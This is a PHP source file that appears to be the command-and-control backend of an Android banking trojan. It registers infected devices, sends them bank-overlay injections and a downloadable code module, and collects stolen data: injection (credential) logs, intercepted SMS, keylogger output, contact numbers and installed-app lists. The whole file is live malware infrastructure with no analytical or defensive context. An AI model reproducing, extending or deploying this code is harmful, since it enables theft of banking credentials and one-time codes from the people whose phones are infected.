<?php

/*CONFIG*/

/*DATABASE*/

$operation =  htmlspecialchars($_REQUEST["action"], ENT_QUOTES);
$data = htmlspecialchars($_REQUEST["data"], ENT_QUOTES);

include 'db.php';
include 'conf.php';

$data =  decrypt($data,key);
$bots_con = new bots_con();

//------Filter request----------
$dataTmp = str_replace(' ','', $data);
$dataTmp = strtolower($dataTmp);
$arraySignet = array('<script>', '</script>');
foreach($arraySignet as $signet){
	if (preg_match("/$signet/", $dataTmp)) {
		return;
	}
}
//------------------------------

$jsonDecode = json_decode($data);
switch ($operation) {
		case "checkAP":
			echo encrypt("~I~", key);
		break;
    case "botcheck":// Check bot to admin panel
		$idbot =  isset($jsonDecode->{'id'}) ? $jsonDecode->{'id'} : "";
		$idSettings = isset($jsonDecode->{'idSettings'}) ? $jsonDecode->{'idSettings'} : "";
		$number = isset($jsonDecode->{'number'}) ? $jsonDecode->{'number'} : "";
		$statAdmin = isset($jsonDecode->{'statAdmin'}) ? $jsonDecode->{'statAdmin'} : "";
		$statProtect = isset($jsonDecode->{'statProtect'}) ? $jsonDecode->{'statProtect'} : "";
		$statScreen = isset($jsonDecode->{'statScreen'}) ? $jsonDecode->{'statScreen'} : "";
		$statAccessibilty = isset($jsonDecode->{'statAccessibilty'}) ? $jsonDecode->{'statAccessibilty'} : "";
		$statSMS = isset($jsonDecode->{'statSMS'}) ? $jsonDecode->{'statSMS'} : "";
		$statCards = isset($jsonDecode->{'statCards'}) ? $jsonDecode->{'statCards'} : "";
		$statBanks = isset($jsonDecode->{'statBanks'}) ? $jsonDecode->{'statBanks'} : "";
		$statMails = isset($jsonDecode->{'statMails'}) ? $jsonDecode->{'statMails'} : "";
		$activeDevice = isset($jsonDecode->{'activeDevice'}) ? $jsonDecode->{'activeDevice'} : "";
		$timeWorking = isset($jsonDecode->{'timeWorking'}) ? $jsonDecode->{'timeWorking'} : "";
		$statDownloadModule = isset($jsonDecode->{'statDownloadModule'}) ? $jsonDecode->{'statDownloadModule'} : "";
		$locale = isset($jsonDecode->{'locale'}) ? $jsonDecode->{'locale'} : "";
		$batteryLevel = isset($jsonDecode->{'batteryLevel'}) ? $jsonDecode->{'batteryLevel'} : "";


		$checkid = $bots_con->checkIdBot($idbot,$bots_con->getIpBot(),$statScreen,$statAccessibilty,
		$number, $statAdmin, $statProtect, $statSMS, $statCards, $statBanks, $statMails, 
		$activeDevice, $timeWorking,$statDownloadModule,$locale,$batteryLevel);

		if(strcmp($checkid,"1") == 0){
			if(strcmp($statDownloadModule,"1") != 0){
				echo encrypt("||youNeedMoreResources||", key);
			}else{
				$getSettings = $bots_con->getGlobalSettings($idSettings);
				if(strcmp($getSettings, "0") !== 0){
					echo encrypt($getSettings, key);
				}else{
					echo encrypt($bots_con->getCommandBot($idbot), key);
				}
			}
		}else{
			echo encrypt("||no||", key);
		}
        break;
	case "registration":// Registration of bot to admin panel   
		$idbot = isset($jsonDecode->{'id'}) ? $jsonDecode->{'id'} : "";
		$android = isset($jsonDecode->{'android'}) ? $jsonDecode->{'android'} : "";
		$tag = isset($jsonDecode->{'tag'}) ? $jsonDecode->{'tag'} : "";
		$country = isset($jsonDecode->{'country'}) ? $jsonDecode->{'country'} : "";
		$operator = isset($jsonDecode->{'operator'}) ? $jsonDecode->{'operator'} : "";
		$model = isset($jsonDecode->{'model'}) ? $jsonDecode->{'model'} : "";
		echo encrypt($bots_con->addBot($bots_con->getIpBot(), $idbot, $android, $tag, $country, $operator, $model), key);
		break;
	case "injcheck": // Update List Injection
		$idbot =  isset($jsonDecode->{'id'}) ? $jsonDecode->{'id'} : "";
		$apps = isset($jsonDecode->{'apps'}) ? $jsonDecode->{'apps'} : "";
		echo encrypt($bots_con->updateInjection($idbot,$apps), key);	
		break;
	case "getinj": // Downloading Injections       
		$ip = $bots_con->getIpBot(); 
		$inject = isset($jsonDecode->{'inject'}) ? $jsonDecode->{'inject'} : "";
		echo encrypt($bots_con->getInjection($ip,$inject), key);	
		break;
	case "geticon": // Downloading icon       
		$ip = $bots_con->getIpBot(); 
		$inject = isset($jsonDecode->{'inject'}) ? $jsonDecode->{'inject'} : "";
		echo encrypt($bots_con->getIcon($ip,$inject), key);	
		break;
	case "sendInjectLogs": //Send Logs Injections       
		$ip = $bots_con->getIpBot();
		$idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
		$idInject = isset($jsonDecode->{'idinject'}) ? $jsonDecode->{'idinject'} : "";
		$application = isset($jsonDecode->{'application'}) ? $jsonDecode->{'application'} : "";
		$dataInjection = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
		echo encrypt($bots_con->addInjection($ip, $idbot, $idInject, $application, $dataInjection), key);	
		break;
	case "sendSmsLogs": //Send Logs SMS       
		$ip = $bots_con->getIpBot();
		$idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
		$logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
		$dateToDevice = isset($jsonDecode->{'date'}) ? $jsonDecode->{'date'} : "";
		echo encrypt($bots_con->addLogSms($ip, $idbot, $logs, $dateToDevice), key);	
		break;
	case "sendSmsLogs": //Send Logs SMS       
		$ip = $bots_con->getIpBot();
		$idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
		$logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
		$dateToDevice = isset($jsonDecode->{'date'}) ? $jsonDecode->{'date'} : "";
		echo encrypt($bots_con->addLogSms($ip, $idbot, $logs, $dateToDevice), key);	
		break;
	case "sendKeylogger": //Send Logs Keylogger       
		$ip = $bots_con->getIpBot();
		$idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
		$logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
		echo encrypt($bots_con->addLogKeylogger($ip, $idbot, $logs), key);	
		break;
	case "timeInject": //Send start Injections
		$idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
		$inject = isset($jsonDecode->{'inject'}) ? $jsonDecode->{'inject'} : "";
		echo encrypt($bots_con->timeInjectStart($idbot,$inject), key);	
		break;
	case "getModule": //Get DexModule Bot   
		$ip = $bots_con->getIpBot();
		$idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
		echo encrypt($bots_con->getApkModule($ip, $idbot), key);	
		break;
		
	case "sendListSavedSMS":// List saved
		$ip = $bots_con->getIpBot();
		$idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
		$logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
		echo encrypt($bots_con->sendListSavedSMS($ip, $idbot, $logs), key);	
		break;
	case "sendListPhoneNumbers":// List phone number
		$ip = $bots_con->getIpBot();
		$idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
		$logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
		echo encrypt($bots_con->sendListPhoneNumbers($ip, $idbot, $logs), key);	
		break;
	case "sendListApplications":// List applications
		$ip = $bots_con->getIpBot();
		$idbot = isset($jsonDecode->{'idbot'}) ? $jsonDecode->{'idbot'} : "";
		$logs = isset($jsonDecode->{'logs'}) ? $jsonDecode->{'logs'} : "";
		echo encrypt($bots_con->sendListApplications($ip, $idbot, $logs), key);	
		break;
}

?>	
